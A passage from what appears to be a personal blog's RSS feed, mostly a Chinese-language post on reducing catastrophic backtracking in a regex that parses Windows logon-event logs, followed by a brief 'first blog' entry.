&lt;pre&gt;&lt;code&gt;(已成功登录帐户。\s*主题:\s*安全 ID:\s*(.*?)\s*帐户名:\s*(.*?)\s*帐户域:\s*(.*?)\s*登录 ID:\s*(.*?)\s*登录类型:\s*(.*?)\s* 新登录:\s*安全 ID\s*(.*?)\s*帐户名:\s*(.*?)\s*帐户域:\s*(.*?)\s*登录 ID:\s*(.*?)\s*登录 GUID:\s*(.*?)\s*进程信息:\s*进程 ID:\s*(.*?)\s*进程名:\s*(.*?)\s*网络信息:\s*工作站名:\s*(.*?)\s*源网络地址:\s*(?:\-|(\S+))\s*源端口:\s*(?:(\d+)|\-)\s*详细身份验证信息:\s*登录进程:\s*(.*?)\s*身份验证数据包:\s*(.*?)\s*传递服务:\s*(.*?)\s*数据包名\(仅限 NTLM\):\s*(.*?)\s*密钥长度:\s*(.*?)\s*在创建登录会话后在被访问的计算机上生成此事件。\s*“主题”字段指明本地系统上请求登录的帐户。\s*这通常是一个服务\(例如 Server 服务\)或本地进程\(例如 Winlogon.exe 或 Services.exe\)。\s*“登录类型”字段指明发生的登录种类。\s*最常见的类型是 2 \(交互式\)和 3 \(网络\)。\s*“新登录”字段会指明新登录是为哪个帐户创建的，即登录的帐户。\s*“网络”字段指明远程登录请求来自哪里。\s*“工作站名”并非总是可用，而且在某些情况下可能会留为空白。\s*“身份验证信息”字段提供关于此特定登录请求的详细信息。\s*-“登录 GUID”是可以用于将此事件与一个 KDC 事件关联起来的唯一标识符。\s*-“传递服务”指明哪些直接服务参与了此登录请求。\s*- “数据包名”指明在 NTLM 协议之间使用了哪些子协议。\s*-“密钥长度”指明生成的会话密钥的长度。\s*如果没有请求会话密钥则此字段为 0。)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个例子中直接测试的话regexbuddy匹配超过100万次就停止了（下面的次数都是指匹配失败的情况下）。实际匹配完成需要的次数可能远远超过100万次。如果把&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(.*?) 全部换成 (\S*?)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;之后只需要2300次左右匹配就结束了。当然这里账户名可能含有空格，如果把账户名，账户域，依然用点星来匹配，其他的换成\S,需要的匹配次数仍然超过100万次。看起来这个问题主要是由于点号导致的。可以再进一步优化下，把点号换成&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[^:]&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;既假设用户名里是不含有冒号的。这样子的匹配次数是依然超过100万次。。。貌似没有什么效果。&lt;/p&gt;

&lt;p&gt;上面的方法都是基于字符精确话这个原则。此外还可以利用原子组和占有优先量词避免回溯。以占有优先量词为例，它的语法是在量词后面加一个+号。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;比如： \s*+  这样子的话，它匹配到的字符会作为一个整体，不会再产生回溯。&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;虽然上面的正则是贪婪匹配，匹配到了好几个空格，但是加了占有优先量词，就不会再出现吐一个字符出来，产生回溯的情况。&lt;/p&gt;

&lt;p&gt;这个例子中，经过上面的优化没有效果的情况下，把每个冒号后面的第一个&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;\s* 换成 \s*+&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;匹配次数降到了3万次，已经可以运行了。其实这个效果并不是很好。当把登录ID的&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;\S*? 换成 .*?之后，匹配次数马上达到了27万次&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;按照思路三：&lt;/p&gt;

&lt;p&gt;经过一番调试发现，如果把&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;\s*(.*?)\s* 换成(.*?)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;匹配次数只需要38000次，所以把量词修饰的元字符放在一起才是造成这个性能问题的主要原因。&lt;/p&gt;

&lt;p&gt;这里\s其实是用来净化捕获组的获取的字符串，去掉字符串首尾的空格。如果程序在存储或展示的时候有对字符串进行去掉首尾空格的处理，那么正则就可以省略这个步骤，就不存在性能问题了。日志相对来说还是比较短的，只要注意思路三，一般不会引起性能问题。&lt;/p&gt;

&lt;h2 id='id2525'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://www.cnxct.com/regularexpressions-pptx-pdf-share/'&gt;全面的正则讲解PPT，因为只是PPT很多只是点到没有细讲&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://jm.taobao.org/2012/10/29/java%E6%AD%A3%E5%88%99%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/'&gt;Java正则引发的思考&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.regular-expressions.info/catastrophic.html'&gt;Catastrophic Backtracking&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/2013/06/07/</link>
                <guid>http://username.github.io/2013/06/</guid>
                <pubDate>2013-06-07T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>My first blog</title>
                <description>&lt;p&gt;This is my first blog.I will try my best to make it a better palce.First I should learn the markdown language.~~~&lt;/p&gt;</description>
                <link>http://username.github.io/2013/05/24/my-first-blog</link>
                <guid>http://username.github.io/2013/05/24/my-first-blog</guid>
                <pubDate>2013-05-24T00:00:00+08:00</pubDate>
        </item>


</channel>
</rss>
